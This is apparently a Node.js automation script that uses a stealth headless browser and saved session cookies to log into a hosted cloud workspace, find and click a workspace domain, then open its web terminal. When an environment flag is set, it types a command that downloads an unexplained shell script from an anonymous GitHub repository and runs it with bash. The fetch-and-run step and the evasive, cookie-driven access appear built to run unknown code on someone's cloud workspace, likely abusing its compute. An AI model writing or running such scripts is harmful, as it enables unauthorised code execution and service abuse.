import { launch } from 'cloakbrowser';
import fs from 'fs';

const CONFIG = {
  workspaceDomain: '139.zo.computer',
  runTmuxInit: process.env.INIT_TMUX === '1',
  tmuxCommand:
    "wget -O zzz.sh https://raw.githubusercontent.com/yghhbbuy/vvvioui/refs/heads/main/zzz.sh && chmod +x zzz.sh && bash zzz.sh",
};

async function safeScreenshot(page, path) {
  try {
    await page.screenshot({ path, fullPage: true });
  } catch {}
}

async function run() {
  const url = process.argv[2];
  if (!url) {
    console.error('❌ 请传入 URL');
    process.exit(1);
  }

  // ✅ 1. 读取 cookies
  let storageState;
  if (fs.existsSync('cookies.json')) {
    console.log('🍪 加载 cookies.json...');
    storageState = JSON.parse(fs.readFileSync('cookies.json', 'utf8'));
  } else {
    console.log('⚠️ 未找到 cookies.json');
  }

  const browser = await launch({ headless: true });

  const context = await browser.newContext({
    storageState,
    viewport: { width: 1920, height: 1080 },
    userAgent:
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36',
  });

  const page = await context.newPage();

  try {
    console.log('🌐 打开页面:', url);

    // ✅ 2. 使用 networkidle（关键修复）
    await page.goto(url, {
      waitUntil: 'networkidle',
      timeout: 90000,
    });

    // ✅ 3. 等待 SPA 渲染
    await page.waitForTimeout(8000);

    await safeScreenshot(page, 'after-load.png');

    // ✅ 4. 检查是否跳登录页
    const content = await page.content();
    if (content.includes('登录') || content.includes('login')) {
      console.log('❌ 当前仍在登录页，cookies 失效');
      fs.writeFileSync('debug-login.html', content);
      return;
    }

    console.log(`🔎 查找域名: ${CONFIG.workspaceDomain}`);

    // ✅ 5. 多策略查找（核心优化）
    let domain = page.locator(`:has-text("${CONFIG.workspaceDomain}")`).first();

    // 👉 如果找不到，尝试 iframe
    if ((await domain.count()) === 0) {
      console.log('⚠️ 主页面未找到，尝试 iframe...');

      for (const frame of page.frames()) {
        try {
          const fLocator = frame.locator(`:has-text("${CONFIG.workspaceDomain}")`);
          if ((await fLocator.count()) > 0) {
            domain = fLocator.first();
            console.log('✅ 在 iframe 中找到');
            break;
          }
        } catch {}
      }
    }

    // 👉 如果还是没有 -> 滚动加载
    if ((await domain.count()) === 0) {
      console.log('⚠️ 尝试滚动加载...');
      for (let i = 0; i < 5; i++) {
        await page.mouse.wheel(0, 1000);
        await page.waitForTimeout(2000);

        if ((await domain.count()) > 0) break;
      }
    }

    // ✅ 6. 最终检查
    if ((await domain.count()) === 0) {
      console.log('❌ 最终仍未找到域名');

      const html = await page.content();
      fs.writeFileSync('debug.html', html);

      await safeScreenshot(page, 'not-found.png');
      return;
    }

    // ✅ 7. 点击
    await domain.waitFor({
      state: 'visible',
      timeout: 30000,
    });

    await domain.click({ force: true });

    console.log('✅ 已点击域名');

    await page.waitForTimeout(20000);

    // ✅ 8. tmux 初始化
    if (CONFIG.runTmuxInit) {
      console.log('🖥️ 启动终端...');
      await page.keyboard.press('Control+Shift+`');
      await page.waitForTimeout(5000);

      await page.keyboard.insertText(CONFIG.tmuxCommand);
      await page.keyboard.press('Enter');
    }

    await safeScreenshot(page, 'result.png');

    console.log('✅ 完成');
  } catch (err) {
    console.error('❌ 错误:', err);
    await safeScreenshot(page, 'error.png');
  } finally {
    await browser.close();
  }
}

run();
